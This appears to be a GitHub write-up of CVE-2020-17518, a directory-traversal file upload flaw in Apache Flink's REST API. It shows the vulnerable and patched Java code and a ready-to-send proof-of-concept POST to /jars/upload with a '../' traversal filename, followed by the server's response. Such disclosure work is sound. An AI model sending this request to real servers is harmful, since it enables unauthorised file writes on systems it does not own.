<b>[CVE-2020-17518] Apache Flink RESTful API Arbitrary File Upload via Directory Traversal</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Apache Flink is a framework and distributed processing engine for stateful computations over unbounded and bounded data streams which developed using Java and 
Scala. A REST handler which was introduced in Apache Flink 1.5.1 is vulnerable to arbitrary file upload vulnerability via directory traversal. This vulnerability allows attackers to file uploads to arbitrary directories on the local filesystem via crafted HTTP requests.

While all versions before `1.11.3` are affected the related vulnerability, Apache Flink has been fixed vulnerability for versions `1.11.3` and above.

Vulnerable code is `src/main/java/org/apache/flink/runtime/rest/FileUploadHandler.java` class. Related code snippet is down below.

```java
import javax.annotation.Nullable;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

		final DiskFileUpload fileUpload = (DiskFileUpload) data;
		checkState(fileUpload.isCompleted());

		final Path dest = currentUploadDir.resolve(fileUpload.getFilename());

		fileUpload.renameTo(dest.toFile());
		LOG.trace("Upload of file {} complete.", fileUpload.getFilename());
	} else if (data.getHttpDataType() == InterfaceHttpData.HttpDataType.Attribute) {
		final Attribute request = (Attribute) data;
```

The problem is that user input that `filename` parameter is not sanitazed in any way. With this [commit](https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4?branch=a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4&diff=split), vulnerability has been fixed: in order to remove any path information, filename is wrapping around another file instantiation.

```java
import javax.annotation.Nullable;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

		final DiskFileUpload fileUpload = (DiskFileUpload) data;
		checkState(fileUpload.isCompleted());

		//final Path dest = currentUploadDir.resolve(fileUpload.getFilename());
		final Path dest = currentUploadDir.resolve(new File(fileUpload.getFilename()).getName());
		
		fileUpload.renameTo(dest.toFile());
		//LOG.trace("Upload of file {} complete.", fileUpload.getFilename());
		LOG.trace("Upload of file {} into destination {} complete.", fileUpload.getFilename(), dest.toString());
	} else if (data.getHttpDataType() == InterfaceHttpData.HttpDataType.Attribute) {
		final Attribute request = (Attribute) data;
```

<b>Proof of Concept (PoC):</b> In order to exploit this vulnerability, you can use the following request

```
POST /jars/upload HTTP/1.1
Host: vulnerablehost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 217

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/CVE-2020-17519-PoC.txt"

This is the PoC file
------WebKitFormBoundaryoZ8meKnrrso89R6Y--
```

Even if the status code of response is `400 Bad Request`, the file is uploaded to the server successfully.

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=UTF-8
Access-Control-Allow-Origin: *
content-length: 6017

{"errors":["org.apache.flink.runtime.rest.handler.RestHandlerException: Exactly 1 file must be sent, received 0.\n\tat org.apache.flink.runtime.webmonitor.handlers.JarUploadHandler.handleRequest(JarUploadHandler.java:76)\n\tat org.apache.flink.runtime.rest.handler.AbstractRestHandler.respondToRequest(AbstractRestHandler.java:73)\n\tat org.apache.flink.runtime.rest.handler.AbstractHandler.respondAsLeader(AbstractHandler.java:178)\n\tat org.apache.flink.runtime.rest.handler.LeaderRetrievalHandler.lambda$channelRead0$0(LeaderRetrievalHandler.java:81)\n\tat java.util.Optional.ifPresent(Optional.java:159)\n\tat org.apache.flink.util.OptionalConsumer.ifPresent(OptionalConsumer.java:46)\n\tat org.apache.flink.runtime.rest.handler.LeaderRetrievalHandler.channelRead0(LeaderRetrievalHandler.java:78)\n\tat org.apache.flink.runtime.rest.handler.LeaderRetrievalHandler.channelRead0(LeaderRetrievalHandler.java:49)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:105)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:352)\n\tat org.apache.flink.runtime.rest.handler.router.RouterHandler.routed(RouterHandler.java:110)\n\tat org.apache.flink.runtime.rest.handler.router.RouterHandler.channelRead0(RouterHandler.java:89)\n\tat org.apache.flink.runtime.rest.handler.router.RouterHandler.channelRead0(RouterHandler.java:54)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:105)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:352)\n\tat org.apache.flink.shaded.netty4.io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:352)\n\tat org.apache.flink.runtime.rest.FileUploadHandler.channelRead0(FileUploadHandler.java:169)\n\tat org.apache.flink.runtime.rest.FileUploadHandler.channelRead0(FileUploadHandler.java:68)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:105)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:352)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:438)\n\tat org.apache.flink.shaded.netty4.io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:328)\n\tat org.apache.flink.shaded.netty4.io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:302)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:253)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:352)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1421)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:930)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:697)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:632)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:549)\n\tat org.apache.flink.shaded.netty4.io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:511)\n\tat org.apache.flink.shaded.netty4.io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:918)\n\tat org.apache.flink.shaded.netty4.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)\n\tat java.lang.Thread.run(Thread.java:748)\n"]}
```
![Image of PoC](https://github.com/murataydemir/CVE-2020-17518/blob/main/poc.png)
![Image of PoC](https://github.com/murataydemir/CVE-2020-17518/blob/main/poc2.png)
